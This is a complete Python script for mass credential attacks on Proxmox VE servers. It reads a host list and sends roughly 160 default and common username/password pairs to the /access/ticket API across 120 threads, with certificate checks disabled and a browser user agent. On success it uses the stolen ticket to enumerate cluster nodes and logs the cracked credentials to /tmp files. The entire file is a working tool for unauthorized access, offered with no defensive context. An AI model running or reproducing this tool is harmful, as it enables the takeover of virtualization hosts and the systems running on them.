#!/usr/bin/env python3
"""Proxmox VE credential sweep. Success = /access/ticket returns a ticket."""
import sys,json,re,time,threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests,urllib3
urllib3.disable_warnings()
T=12
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
USERS=["root@pam","admin@pam","root@pve","admin@pve"]
PWS=["root","password","admin","123456","12345678","proxmox","toor","qwerty","changeme",
     "P@ssw0rd","Password1","password1","admin123","123456789","111111","000000","letmein",
     "welcome","master","server","linux","vps","host","prox","pve","test123","default",
     "root123","1qaz2wsx","zaq12wsx","Passw0rd","abc123","qwerty123","123qwe","secret",
     "administrator","webmin","virtualizor","pveadmin","proxmox123","Proxmox123"]
CREDS=[(u,p) for u in USERS for p in PWS]
def one(host):
    out={"host":host}
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    try:
        v=s.get(f"https://{host}/api2/json/version",timeout=T)
        if v.status_code not in (200,401,403): return None
        out["ver_code"]=v.status_code
    except Exception: return None
    for u,p in CREDS:
        try:
            r=s.post(f"https://{host}/api2/json/access/ticket",data={"username":u,"password":p},timeout=T)
        except Exception: return out
        if r.status_code==200 and "ticket" in (r.text or ""):
            out.update({"user":u,"pw":p,"PROVEN":True})
            try:
                d=r.json().get("data",{})
                out["ticket_user"]=d.get("username"); out["realm"]=d.get("realm")
                t=d.get("ticket")
                h=s.get(f"https://{host}/api2/json/nodes",headers={"Cookie":f"PVEAuthCookie={t}"},timeout=T)
                out["nodes_code"]=h.status_code
                if h.status_code==200:
                    try: out["nodes"]=[n.get("node") for n in h.json().get("data",[])]
                    except Exception: pass
            except Exception: pass
            return out
    out["tried"]=len(CREDS)
    return out
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    res,hits,lock=[],[],threading.Lock()
    t0=time.time(); n=0
    with ThreadPoolExecutor(max_workers=120) as ex:
        for f in as_completed([ex.submit(one,h) for h in hosts]):
            n+=1
            try: r=f.result()
            except Exception: r=None
            if r:
                with lock: res.append(r)
                if r.get("PROVEN"):
                    with lock: hits.append(r); json.dump(hits,open("/tmp/pve_hits.json","w"),indent=1)
                    print(f"🔥 {r['host']} {r['user']}:{r['pw']} nodes={r.get('nodes')}",flush=True)
            if n%300==0: print(f"  .. {n}/{len(hosts)} hits={len(hits)} {time.time()-t0:.0f}s",flush=True)
    json.dump({"scanned":len(hosts),"proven":hits,"all":res},open("/tmp/pve_result.json","w"),indent=1)
    print(f"\nDONE n={len(hosts)} PROVEN={len(hits)} in {time.time()-t0:.0f}s",flush=True)
main()
